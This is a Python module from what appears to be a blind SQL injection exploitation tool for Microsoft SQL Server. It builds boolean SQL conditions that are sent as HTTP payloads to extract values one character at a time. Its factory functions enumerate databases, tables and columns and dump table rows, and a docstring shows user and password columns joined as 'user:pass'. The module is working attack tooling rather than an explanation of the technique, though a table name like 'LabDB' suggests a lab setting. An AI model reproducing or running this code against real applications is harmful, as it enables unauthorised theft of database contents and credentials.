"""Extraction targets (the "Oracle / condition generator" layer).

A :class:`Target` wraps a scalar-returning SQL expression and turns *hypotheses*
about its value into boolean SQL conditions, using a dialect. The engine only
ever talks to a Target through this interface, so adding a new thing to extract
(database name, column name, a field value, a COUNT, ...) means constructing a
different Target — no engine changes.

    hypothesis ("char 4 is 'u'" / "value starts with 'jun_'" / "length is 9")
        -> Target                (this module)
        -> boolean SQL condition (dialect)
        -> payload               (payload.py)
        -> HTTP request          (http_client.py)
        -> classifier verdict    (classifier.py)
        -> True / False          (oracle.py)
"""

from __future__ import annotations

from dataclasses import dataclass

from .dialect import SqlDialect


@dataclass
class Target:
    """A single scalar value to exfiltrate character by character."""

    name: str          # label for output, e.g. "TABLE_NAME"
    expression: str    # SQL scalar subquery, e.g. "(SELECT TOP(1) TABLE_NAME ...)"
    dialect: SqlDialect

    # --- character-level hypotheses ----------------------------------------
    def char_is(self, pos: int, ch: str) -> str:
        """Condition: the character at 1-based *pos* equals *ch*."""
        return self.dialect.char_eq(self.expression, pos, ch)

    def char_le(self, pos: int, ch: str) -> str:
        """Condition: the character at *pos* is <= *ch* (for binary search)."""
        return self.dialect.char_le(self.expression, pos, ch)

    # --- sequence-level hypotheses -----------------------------------------
    def substring_is(self, pos: int, value: str) -> str:
        """Condition: the substring starting at *pos* equals *value*.

        Verifies a whole predicted sequence in a single request.
        """
        return self.dialect.substr_eq(self.expression, pos, value)

    def starts_with(self, prefix: str) -> str:
        """Condition: the value begins with *prefix* (LIKE prefix match)."""
        return self.dialect.prefix_like(self.expression, prefix)

    # --- existence ----------------------------------------------------------
    def exists_condition(self) -> str:
        """Condition: this target yields a (non-NULL) value / row.

        Used to verify a target exists before extracting it, so a missing row
        costs a single request instead of a full, futile character search.
        """
        return self.dialect.is_not_null(self.expression)

    # --- length hypotheses --------------------------------------------------
    def length_is(self, n: int) -> str:
        return self.dialect.length_eq(self.expression, n)

    def length_le(self, n: int) -> str:
        return self.dialect.length_le(self.expression, n)

    def length_ge(self, n: int) -> str:
        return self.dialect.length_ge(self.expression, n)


# --- convenience factories for common metadata targets ---------------------
# These are just preset Target instances; the engine treats them all the same.

def _catalog_prefix(database: str) -> str:
    """Three-part-name catalog prefix for a database, e.g. '[appdb].' (MSSQL).

    INFORMATION_SCHEMA is scoped to the current database, so to read another
    database's metadata you qualify it with the database (catalog) name. The
    name is bracket-quoted (']' doubled) to tolerate awkward identifiers.
    """
    if not database:
        return ""
    return "[" + database.replace("]", "]]") + "]."


def tables_count_expr(database: str = None, where: str = None) -> str:
    """COUNT(*) of tables, optionally filtered by *where* (e.g. a LIKE clause)."""
    src = f"{_catalog_prefix(database)}INFORMATION_SCHEMA.TABLES"
    filt = f" WHERE {where}" if where else ""
    return f"(SELECT COUNT(*) FROM {src}{filt})"


def first_table_name(dialect: SqlDialect, offset: int = 0, database: str = None,
                     where: str = None) -> Target:
    """First (offset-th) table name from INFORMATION_SCHEMA (MSSQL-style).

    If *database* is given, read that database's catalog instead of the current
    one (three-part naming). *where* is an optional SQL filter on the catalog
    (e.g. "TABLE_NAME LIKE '%user%'") applied to both the count and each name;
    it must match the filter passed to :func:`tables_count_expr`.
    """
    src = f"{_catalog_prefix(database)}INFORMATION_SCHEMA.TABLES"
    filt = f" WHERE {where}" if where else ""
    if offset == 0:
        expr = f"(SELECT TOP(1) TABLE_NAME FROM {src}{filt} ORDER BY TABLE_NAME)"
    else:
        expr = (
            f"(SELECT TABLE_NAME FROM {src}{filt} ORDER BY TABLE_NAME "
            f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
        )
    label = f"TABLE_NAME[{offset}]" if not database else f"TABLE_NAME[{database}:{offset}]"
    return Target(name=label, expression=expr, dialect=dialect)


def database_name(dialect: SqlDialect) -> Target:
    """The current database name."""
    return Target(name="DB_NAME", expression="(SELECT DB_NAME())", dialect=dialect)


def nth_database_name(dialect: SqlDialect, offset: int = 0) -> Target:
    """The offset-th database name on the server (MSSQL sys.databases)."""
    if offset == 0:
        expr = "(SELECT TOP(1) name FROM sys.databases ORDER BY name)"
    else:
        expr = (
            f"(SELECT name FROM sys.databases ORDER BY name "
            f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
        )
    return Target(name=f"DATABASE_NAME[{offset}]", expression=expr, dialect=dialect)


def columns_count_expr(table: str, database: str = None, where: str = None) -> str:
    """COUNT(*) of columns for *table*, optionally narrowed by *where*.

    *where* is ANDed with the table-name predicate (e.g. "TABLE_SCHEMA='dbo'"
    to restrict to the dbo schema); it must match the filter given to
    :func:`first_column_name`.
    """
    src = f"{_catalog_prefix(database)}INFORMATION_SCHEMA.COLUMNS"
    tbl = table.replace("'", "''")
    extra = f" AND ({where})" if where else ""
    return f"(SELECT COUNT(*) FROM {src} WHERE TABLE_NAME='{tbl}'{extra})"


def first_column_name(dialect: SqlDialect, table: str, offset: int = 0,
                      database: str = None, where: str = None) -> Target:
    src = f"{_catalog_prefix(database)}INFORMATION_SCHEMA.COLUMNS"
    tbl = table.replace("'", "''")
    extra = f" AND ({where})" if where else ""
    expr = (
        f"(SELECT COLUMN_NAME FROM {src} "
        f"WHERE TABLE_NAME = '{tbl}'{extra} ORDER BY ORDINAL_POSITION "
        f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
    )
    label = f"COLUMN_NAME[{table}:{offset}]" if not database else f"COLUMN_NAME[{database}.{table}:{offset}]"
    return Target(name=label, expression=expr, dialect=dialect)


def _bracket(name: str) -> str:
    return "[" + name.replace("]", "]]") + "]"


def _table_source(database, schema, table) -> str:
    """Fully-qualified table source, e.g. '[LabDB].[dbo].[jun_users]'."""
    cat = _catalog_prefix(database)
    return f"{cat}{_bracket(schema or 'dbo')}.{_bracket(table)}"


def row_count_expr(database, schema, table, where=None) -> str:
    src = _table_source(database, schema, table)
    filt = f" WHERE {where}" if where else ""
    return f"(SELECT COUNT(*) FROM {src}{filt})"


def row_value(dialect: SqlDialect, table: str, columns, offset: int = 0,
              database: str = None, schema: str = "dbo", sep: str = ":",
              where: str = None, order_by: str = None, row_expr: str = None) -> Target:
    """A single row's value from a data table, one row per *offset*.

    Multiple *columns* are concatenated with *sep* using CONCAT (NULL-safe and
    auto-casting in MSSQL), so e.g. columns=['user','pass'] yields 'user:pass'.
    A raw *row_expr* overrides *columns* for full control.
    """
    src = _table_source(database, schema, table)
    filt = f" WHERE {where}" if where else ""
    if row_expr:
        value_expr = row_expr
    elif len(columns) == 1:
        value_expr = columns[0]
    else:
        parts = []
        for i, col in enumerate(columns):
            if i:
                parts.append(dialect.quote_str(sep))
            parts.append(col)
        value_expr = "CONCAT(" + ", ".join(parts) + ")"
    order = order_by or (columns[0] if columns else "(SELECT NULL)")
    expr = (
        f"(SELECT {value_expr} FROM {src}{filt} ORDER BY {order} "
        f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
    )
    return Target(name=f"ROW[{table}:{offset}]", expression=expr, dialect=dialect)


def match_where(dialect: SqlDialect, column: str, needle: str,
                exact: bool = False, case_sensitive: bool = False) -> str:
    """A WHERE predicate testing whether *column* matches *needle*.

    Substring by default (``LIKE '%needle%'``), or exact equality. Reusable both
    to confirm a location (wrapped in COUNT>0) and to filter the rows extracted
    from a confirmed location.
    """
    if exact:
        return dialect.value_eq(_bracket(column), needle, case_sensitive)
    return dialect.contains(_bracket(column), needle, case_sensitive)


def column_match_count_expr(dialect: SqlDialect, database, schema, table, column,
                            needle: str, exact: bool = False,
                            case_sensitive: bool = False) -> str:
    """COUNT(*) of rows where *column* matches *needle* (see :func:`match_where`).

    ``column_match_count_expr(...) > 0`` is the single boolean question that
    confirms a keyword lives in a column, over the boolean side channel.
    """
    src = _table_source(database, schema, table)
    pred = match_where(dialect, column, needle, exact=exact, case_sensitive=case_sensitive)
    return f"(SELECT COUNT(*) FROM {src} WHERE {pred})"


def custom(dialect: SqlDialect, name: str, expression: str) -> Target:
    """Wrap any scalar-returning subquery the operator supplies."""
    return Target(name=name, expression=expression, dialect=dialect)
